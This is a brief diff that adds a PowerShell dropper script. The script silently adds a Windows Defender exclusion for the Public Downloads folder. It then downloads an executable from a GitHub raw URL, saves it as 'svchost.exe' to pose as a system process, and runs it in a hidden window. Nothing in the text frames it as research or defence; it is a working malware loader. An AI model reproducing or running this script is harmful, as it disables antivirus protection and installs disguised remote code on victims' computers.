@@ -1,0 +1,9 @@
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
+
+$url1 = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Diddyoil.exe'
+
+$location1 = 'C:\Users\Public\Downloads\svchost.exe'
+
+Invoke-WebRequest -Uri $url1 -OutFile $location1
+
+Start-Process -FilePath $location1 -WindowStyle Hidden
